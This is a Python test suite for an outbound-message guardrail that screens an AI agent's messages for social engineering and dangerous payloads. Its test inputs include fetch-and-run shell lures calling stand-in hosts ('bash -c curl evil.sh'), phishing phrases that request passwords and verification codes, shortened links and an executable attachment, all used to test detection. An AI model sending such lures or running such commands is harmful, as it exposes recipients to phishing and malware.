"""G3 出站消息护栏测试 (v0.52.1 M1)。

覆盖:
- OutboundMessage 模型校验
- SocialEngineeringDetector 8 类模式
- OutboundPayloadSanitizer 载荷消毒
- ContactReputation 信誉管理
- OutboundMessageGate 三态裁决 + AISI 场景端到端
- OutboundGuard 通道挂接
- sentinel AttackType 扩展
"""

from __future__ import annotations

import asyncio

import pytest

from maref.security.outbound import (
    BlockedOutboundError,
    ContactReputation,
    ContactTier,
    GateDecision,
    HITLRequiredError,
    OutboundAttachment,
    OutboundChannel,
    OutboundGuard,
    OutboundMessage,
    OutboundMessageGate,
    OutboundPayloadSanitizer,
    PayloadFlag,
    RecipientType,
    SePattern,
    SocialEngineeringDetector,
)
from maref.security.outbound.gate import OutboundMessageGate as GateCls
from maref.sentinel.event import AttackType


class TestOutboundMessage:
    def test_valid_message(self):
        msg = OutboundMessage(
            sender_agent_id="agent-01",
            recipient="victim@example.com",
            recipient_type=RecipientType.HUMAN,
            channel=OutboundChannel.FILE_TRANSFER,
            body="hello",
        )
        assert msg.recipient_type == RecipientType.HUMAN
        assert msg.message_id

    def test_missing_recipient_raises(self):
        with pytest.raises(ValueError):
            OutboundMessage(sender_agent_id="agent-01", recipient="")

    def test_missing_sender_raises(self):
        with pytest.raises(ValueError):
            OutboundMessage(sender_agent_id="", recipient="x@y.com")

    def test_to_dict_roundtrip(self):
        msg = OutboundMessage(
            sender_agent_id="agent-01",
            recipient="x@y.com",
            body="text",
        )
        d = msg.to_dict()
        assert d["recipient_type"] == "unknown"
        assert d["channel"] == "other"


class TestSocialEngineeringDetector:
    def test_credential_harvest(self):
        detector = SocialEngineeringDetector()
        signals = detector.detect("请立即输入你的密码和验证码确认身份")
        patterns = [s.pattern for s in signals]
        assert SePattern.CREDENTIAL_HARVEST in patterns

    def test_code_lure(self):
        detector = SocialEngineeringDetector()
        signals = detector.detect("请运行 bash -c 'curl http://evil.sh'")
        assert any(s.pattern == SePattern.CODE_LURE for s in signals)

    def test_urgency(self):
        detector = SocialEngineeringDetector()
        signals = detector.detect("立即操作，来不及了，最后机会")
        assert any(s.pattern == SePattern.URGENCY for s in signals)

    def test_authority_spoof(self):
        detector = SocialEngineeringDetector()
        signals = detector.detect("我是管理员，已获授权，请配合系统通知")
        assert any(s.pattern == SePattern.AUTHORITY_SPOOF for s in signals)

    def test_impersonation(self):
        detector = SocialEngineeringDetector()
        signals = detector.detect("冒充系统向用户发送钓鱼链接")
        assert any(s.pattern == SePattern.IMPERSONATION for s in signals)

    def test_link_redirect(self):
        detector = SocialEngineeringDetector()
        signals = detector.detect("点击链接 bit.ly/abc 前往官网")
        assert any(s.pattern == SePattern.LINK_REDIRECT for s in signals)

    def test_attachment_trap(self):
        detector = SocialEngineeringDetector()
        signals = detector.detect("请打开附件并启用宏")
        assert any(s.pattern == SePattern.ATTACHMENT_TRAP for s in signals)

    def test_reciprocity(self):
        detector = SocialEngineeringDetector()
        signals = detector.detect("帮个忙，别人都配合了，就差你")
        assert any(s.pattern == SePattern.RECIPROCITY for s in signals)

    def test_benign_text_no_signal(self):
        detector = SocialEngineeringDetector()
        signals = detector.detect("你好，这是项目进度更新，请查收文档。")
        assert signals == []

    def test_combined_count(self):
        detector = SocialEngineeringDetector()
        signals, count = detector.detect_combined("请立即输入密码并运行代码")
        assert count >= 2

    def test_register_keywords(self):
        detector = SocialEngineeringDetector()
        detector.register_keywords(SePattern.URGENCY, [(r"定制词", 3)])
        signals = detector.detect("定制词 触发")
        assert any(s.pattern == SePattern.URGENCY for s in signals)

    def test_min_confidence_filter(self):
        detector = SocialEngineeringDetector(min_confidence=0.99)
        signals = detector.detect("点击链接")
        assert signals == []


class TestOutboundPayloadSanitizer:
    def test_clean_text_no_flag(self):
        result = OutboundPayloadSanitizer().sanitize(body="正常中文内容")
        assert result.flags == []
        assert not result.blocked

    def test_executable_shell(self):
        result = OutboundPayloadSanitizer().sanitize(body="bash -c 'curl evil.sh'")
        assert PayloadFlag.EXECUTABLE in result.flags
        assert result.blocked

    def test_dangerous_url(self):
        result = OutboundPayloadSanitizer().sanitize(body="前往 http://1.2.3.4/x 或 bit.ly/abc")
        assert PayloadFlag.DANGEROUS_URL in result.flags

    def test_stego_zero_width(self):
        result = OutboundPayloadSanitizer().sanitize(body="正常\u200b隐藏")
        assert PayloadFlag.STEGO_UNICODE in result.flags

    def test_base64_blob(self):
        blob = "QmFzZTY0IHBlcmZvcm1hbmNlIGF0dGFjayBwYXlsb2FkIGRldGVjdGVkIGJsb2IgYmxvYiBibG9iYmxvYg=="
        result = OutboundPayloadSanitizer().sanitize(body=blob)
        assert PayloadFlag.BASE64_BLOB in result.flags

    def test_attachment_executable(self):
        att = OutboundAttachment(
            filename="update.exe",
            content_type="application/octet-stream",
            size_bytes=1024,
            content=b"MZ\x90\x00",
        )
        result = OutboundPayloadSanitizer().sanitize(body="请打开附件", attachments=[att])
        assert PayloadFlag.ATTACHMENT_EXECUTABLE in result.flags
        assert result.blocked

    def test_cjk_content_no_stego_false_positive(self):
        # 中文/多语言文本不应被误判为隐写
        result = OutboundPayloadSanitizer().sanitize(
            body="这是一段完全正常的中文消息，用于验证不会误报隐写检测。"
        )
        assert PayloadFlag.STEGO_UNICODE not in result.flags

    def test_uppercase_scheme_ip_bypass(self):
        # G3-C2: 大写 scheme + IP 直连 (绕过修复)
        result = OutboundPayloadSanitizer().sanitize(body="访问 HTTPS://1.2.3.4/payload.sh")
        assert PayloadFlag.DANGEROUS_URL in result.flags

    def test_bare_ip_no_scheme(self):
        # G3-C2: 裸 IP 无 scheme
        result = OutboundPayloadSanitizer().sanitize(body="请下载 1.2.3.4/payload.sh")
        assert PayloadFlag.DANGEROUS_URL in result.flags

    def test_uppercase_http_domain(self):
        # G3-C2: 大写 http scheme 域名
        result = OutboundPayloadSanitizer().sanitize(body="HTTP://example.com/x")
        assert PayloadFlag.DANGEROUS_URL in result.flags

    def test_www_domain_not_false_positive(self):
        # I3 修复: 无 scheme 的合法 www 域名不误判
        result = OutboundPayloadSanitizer().sanitize(body="请访问 www.example.com/report 查看")
        assert PayloadFlag.DANGEROUS_URL not in result.flags

    def test_urlsafe_base64_blob(self):
        # G3-C2: url-safe base64 (含 -_)
        blob = "UEFZTE9BRC1BVFRBQ0stV0lUSC1VUkwtU0FGRS1CQVNFNjQtQkxPQi1JTkdFIQ=="
        result = OutboundPayloadSanitizer().sanitize(body=blob)
        assert PayloadFlag.BASE64_BLOB in result.flags


class TestContactReputation:
    def test_new_contact_starts_by_channel(self):
        rep = ContactReputation()
        low = rep.get("x@y.com", OutboundChannel.FILE_TRANSFER)
        assert low.tier == ContactTier.UNTRUSTED
        norm = rep.get("x@y.com", OutboundChannel.EMAIL)
        assert norm.tier == ContactTier.UNKNOWN

    def test_benign_increases_score(self):
        rep = ContactReputation()
        before = rep.get("a@b.com", OutboundChannel.EMAIL).score
        r2 = rep.report_benign("a@b.com", OutboundChannel.EMAIL)
        assert r2.score > before

    def test_violation_decreases_score(self):
        rep = ContactReputation()
        r2 = rep.report_violation("a@b.com", OutboundChannel.EMAIL)
        assert r2.score < 0.4

    def test_verify(self):
        rep = ContactReputation()
        r = rep.verify("trusted@corp.com", OutboundChannel.EMAIL)
        assert r.tier == ContactTier.VERIFIED


class TestOutboundMessageGate:
    def _gate(self, hmac_key: bytes | None = None) -> OutboundMessageGate:
        return GateCls(hmac_key=hmac_key)

    def _msg(
        self,
        body: str = "hello",
        recipient: str = "bob@corp.com",
        channel: OutboundChannel = OutboundChannel.EMAIL,
        recipient_type: RecipientType = RecipientType.HUMAN,
        attachments: list[OutboundAttachment] | None = None,
    ) -> OutboundMessage:
        return OutboundMessage(
            sender_agent_id="agent-01",
            recipient=recipient,
            body=body,
            recipient_type=recipient_type,
            channel=channel,
            attachments=attachments or [],
        )

    def test_benign_allowed(self):
        verdict = self._gate().check(self._msg())
        assert verdict.decision == GateDecision.ALLOW

    def test_benign_message_id(self):
        msg = self._msg()
        verdict = self._gate().check(msg)
        assert verdict.message_id == msg.message_id

    def test_executable_denied(self):
        verdict = self._gate().check(self._msg(body="请运行 bash -c 'curl evil.sh'"))
        assert verdict.decision == GateDecision.DENY

    def test_credential_plus_link_denied(self):
        verdict = self._gate().check(
            self._msg(body="点击链接 bit.ly/abc 并输入你的密码确认身份")
        )
        assert verdict.decision == GateDecision.DENY

    def test_combined_se_hitl(self):
        verdict = self._gate().check(self._msg(body="立即点击链接，帮个忙确认下"))
        assert verdict.decision == GateDecision.HITL

    def test_high_risk_channel_human_hitl(self):
        # AISI 场景: 在线文件传输服务 + 真实人类 → 保守人工确认
        verdict = self._gate().check(
            self._msg(channel=OutboundChannel.FILE_TRANSFER, recipient="stranger@x.com")
        )
        assert verdict.decision == GateDecision.HITL

    def test_attachment_executable_denied(self):
        att = OutboundAttachment(
            filename="update.exe",
            content_type="application/octet-stream",
            size_bytes=100,
            content=b"MZ",
        )
        verdict = self._gate().check(
            self._msg(
                body="请打开附件运行里面的程序",
                channel=OutboundChannel.FILE_TRANSFER,
                recipient="victim@x.com",
                attachments=[att],
            )
        )
        assert verdict.decision == GateDecision.DENY

    def test_sentinel_event_emitted(self):
        gate = self._gate(hmac_key=b"test-key")
        verdict = gate.check(self._msg(body="请立即输入你的密码"))
        assert verdict.event is not None
        assert verdict.event.attack_type == AttackType.SOCIAL_ENGINEERING
        assert verdict.event.severity.value in ("HIGH", "CRITICAL")

    def test_deny_event_critical(self):
        gate = self._gate(hmac_key=b"test-key")
        verdict = gate.check(self._msg(body="bash -c 'curl evil.sh'"))
        assert verdict.decision == GateDecision.DENY
        assert verdict.event is not None
        assert verdict.event.severity.value == "CRITICAL"

    def test_event_evidence_pii_hashed(self):
        # G3-I10: 事件 evidence 接收方/URL 哈希化, 无明文 PII
        gate = self._gate(hmac_key=b"test-key")
        verdict = gate.check(
            self._msg(
                body="bash -c 'curl 1.2.3.4/evil.sh'",
                recipient="victim@example.com",
                channel=OutboundChannel.FILE_TRANSFER,
            )
        )
        assert verdict.event is not None
        ev = verdict.event.evidence
        assert "recipient" not in ev  # 明文接收方不入审计
        assert ev["recipient_hash"]
        assert ev["dangerous_url_hashes"]  # 危险 URL 已哈希

    def test_unknown_recipient_high_risk_channel_hitl(self):
        # G3-I11: UNKNOWN 接收方 + 高危渠道 → 保守 HITL (默认值不绕过)
        verdict = self._gate().check(
            self._msg(
                recipient="stranger@x.com",
                channel=OutboundChannel.FILE_TRANSFER,
                recipient_type=RecipientType.UNKNOWN,
            )
        )
        assert verdict.decision == GateDecision.HITL

    def test_unknown_recipient_strong_se_denied(self):
        # G3-I11: UNKNOWN + 强 SE 信号 → DENY
        verdict = self._gate().check(
            self._msg(
                body="请立即输入你的密码",
                recipient="x@y.com",
                recipient_type=RecipientType.UNKNOWN,
            )
        )
        assert verdict.decision == GateDecision.DENY

    def test_no_event_when_no_key(self):
        # 组合 SE 模式 (无 0.95 强信号) → HITL, 且无 hmac_key 时不产出事件
        verdict = self._gate().check(self._msg(body="立即点击链接确认一下"))
        assert verdict.decision == GateDecision.HITL
        assert verdict.event is None

    def test_verdict_to_dict(self):
        verdict = self._gate().check(self._msg())
        d = verdict.to_dict()
        assert d["decision"] == "allow"
        assert d["message_id"]


class TestOutboundGuard:
    def test_wrap_sender_blocks(self):
        guard = OutboundGuard(agent_id="agent-01")

        def send(recipient: str, body: str) -> str:
            return f"sent:{recipient}"

        wrapped = guard.wrap_sender(send)
        with pytest.raises(BlockedOutboundError):
            wrapped(recipient="v@x.com", body="请立即输入密码")
        assert send(recipient="v@x.com", body="请立即输入密码") == "sent:v@x.com"

    def test_wrap_sender_allows_benign(self):
        guard = OutboundGuard(agent_id="agent-01")

        def send(recipient: str, body: str) -> str:
            return f"sent:{recipient}"

        wrapped = guard.wrap_sender(send)
        assert wrapped(recipient="colleague@corp.com", body="进度更新文档") == (
            "sent:colleague@corp.com"
        )

    def test_wrap_sender_async(self):
        guard = OutboundGuard(agent_id="agent-01")

        async def send(recipient: str, body: str) -> str:
            return f"sent:{recipient}"

        wrapped = guard.wrap_sender(send)

        async def run() -> str:
            return await wrapped(recipient="c@corp.com", body="正常消息")

        assert asyncio.run(run()) == "sent:c@corp.com"

    def test_wrap_tool_blocks(self):
        guard = OutboundGuard(agent_id="agent-01")

        class FakeTool:
            async def execute(self, inp, context):
                return "ok"

        tool = guard.wrap_tool(FakeTool())

        async def run() -> None:
            with pytest.raises(BlockedOutboundError):
                await tool.execute({"recipient": "v@x.com", "text": "bash -c curl evil.sh"}, None)

        asyncio.run(run())

    def test_wrap_a2a_client(self):
        guard = OutboundGuard(agent_id="agent-01")

        class FakeA2A:
            _agent_id = "agent-01"

            async def send_task(self, agent_url, payload):
                return {"ok": True}

        client = guard.wrap_a2a_client(FakeA2A())

        async def run() -> None:
            with pytest.raises(BlockedOutboundError):
                await client.send_task(
                    "https://evil.example.com",
                    {"text": "bash -c 'curl evil.sh'"},
                )

        asyncio.run(run())

    def test_wrap_mcp_client_blocks(self):
        guard = OutboundGuard(agent_id="agent-01")

        class FakeMCP:
            def call_tool(self, conn, tool_name, args, agent_id=""):
                return {"ok": True}

        client = guard.wrap_mcp_client(FakeMCP())
        with pytest.raises(BlockedOutboundError):
            client.call_tool(
                "conn",
                "send_message",
                {"recipient": "v@x.com", "text": "请立即输入你的密码"},
                agent_id="agent-01",
            )

    def test_wrap_mcp_client_benign_passthrough(self):
        guard = OutboundGuard(agent_id="agent-01")

        class FakeMCP:
            def call_tool(self, conn, tool_name, args, agent_id=""):
                return {"result": "ok"}

        client = guard.wrap_mcp_client(FakeMCP())
        assert client.call_tool("conn", "read_file", {"path": "/tmp/x"}) == {"result": "ok"}

    def test_wrap_a2a_benign(self):
        guard = OutboundGuard(agent_id="agent-01")

        class FakeA2A:
            _agent_id = "agent-01"

            async def send_task(self, agent_url, payload):
                return {"ok": True}

        client = guard.wrap_a2a_client(FakeA2A())

        async def run() -> dict:
            return await client.send_task("https://peer.maref.dev", {"text": "正常协作"})

        assert asyncio.run(run()) == {"ok": True}

    def test_wrap_tool_benign(self):
        guard = OutboundGuard(agent_id="agent-01")

        class FakeTool:
            async def execute(self, inp, context):
                return "ok"

        tool = guard.wrap_tool(FakeTool())

        async def run() -> str:
            return await tool.execute({"path": "/tmp/read"}, None)

        assert asyncio.run(run()) == "ok"

    def test_wrap_mcp_malformed_call_fail_closed(self):
        # G3-I12: MCP 参数结构无法解析 → fail-closed, 不静默透传
        from maref.security.outbound import MalformedOutboundCallError

        guard = OutboundGuard(agent_id="agent-01")

        class FakeMCP:
            def call_tool(self, conn, tool_name, args, agent_id=""):
                return {"ok": True}

        client = guard.wrap_mcp_client(FakeMCP())
        with pytest.raises(MalformedOutboundCallError):
            client.call_tool("conn")  # 只有 2 个位置参数, 无法提取 args

    def test_wrap_mcp_non_dict_args_fail_closed(self):
        # G3-I12: args 非 dict → fail-closed
        from maref.security.outbound import MalformedOutboundCallError

        guard = OutboundGuard(agent_id="agent-01")

        class FakeMCP:
            def call_tool(self, conn, tool_name, args, agent_id=""):
                return {"ok": True}

        client = guard.wrap_mcp_client(FakeMCP())
        with pytest.raises(MalformedOutboundCallError):
            client.call_tool("conn", "x", "not-a-dict")

    def test_wrap_mcp_benign_passthrough(self):
        guard = OutboundGuard(agent_id="agent-01")

        class FakeMCP:
            def call_tool(self, conn, tool_name, args, agent_id=""):
                return {"ok": True}

        client = guard.wrap_mcp_client(FakeMCP())
        assert client.call_tool("conn", "read_file", {"path": "/tmp/x"}) == {"ok": True}


class TestOutboundGuardHITL:
    """G3-C1 修复: HITL 决策在 guard 层不得透传发送 (fail-closed)。"""

    def test_wrap_sender_blocks_hitl(self):
        guard = OutboundGuard(agent_id="agent-01")
        sent: list = []

        def send(recipient: str, body: str) -> str:
            sent.append(recipient)
            return "sent"

        wrapped = guard.wrap_sender(send)
        with pytest.raises(HITLRequiredError):
            wrapped(recipient="victim@x.com", body="立即点击链接确认一下")
        assert sent == []  # 底层 sender 不得被调用

    def test_wrap_sender_async_hitl_blocked(self):
        guard = OutboundGuard(agent_id="agent-01")
        sent: list = []

        async def send(recipient: str, body: str) -> str:
            sent.append(recipient)
            return "sent"

        wrapped = guard.wrap_sender(send)

        async def run() -> None:
            with pytest.raises(HITLRequiredError):
                await wrapped(recipient="victim@x.com", body="立即点击链接确认一下")

        asyncio.run(run())
        assert sent == []

    def test_wrap_tool_blocks_hitl(self):
        guard = OutboundGuard(agent_id="agent-01")

        class FakeTool:
            async def execute(self, inp, context):
                return "ok"

        tool = guard.wrap_tool(FakeTool())

        async def run() -> None:
            with pytest.raises(HITLRequiredError):
                await tool.execute({"recipient": "v@x.com", "text": "立即点击链接确认一下"}, None)

        asyncio.run(run())

    def test_wrap_a2a_blocks_hitl(self):
        guard = OutboundGuard(agent_id="agent-01")

        class FakeA2A:
            _agent_id = "agent-01"

            async def send_task(self, agent_url, payload):
                return {"ok": True}

        client = guard.wrap_a2a_client(FakeA2A())

        async def run() -> None:
            with pytest.raises(HITLRequiredError):
                await client.send_task("https://peer.example.com", {"text": "立即点击链接"})

        asyncio.run(run())

    def test_allow_hitl_passthrough(self):
        guard = OutboundGuard(agent_id="agent-01", allow_hitl_passthrough=True)
        sent: list = []

        def send(recipient: str, body: str) -> str:
            sent.append(recipient)
            return "sent"

        wrapped = guard.wrap_sender(send)
        assert wrapped(recipient="v@x.com", body="立即点击链接确认一下") == "sent"
        assert sent == ["v@x.com"]


class TestAttackTypeExtension:
    def test_new_attack_types(self):
        assert AttackType.SOCIAL_ENGINEERING.value == "social_engineering"
        assert AttackType.IDENTITY_SPOOFING.value == "identity_spoofing"
        assert AttackType.SYBIL_ATTACK.value == "sybil_attack"
        assert AttackType.DECEPTIVE_CHAIN.value == "deceptive_chain"

    def test_legacy_types_preserved(self):
        assert AttackType.PIXEL_TRACKING.value == "pixel_tracking"
        assert AttackType.PRIVILEGE_ABUSE.value == "privilege_abuse"
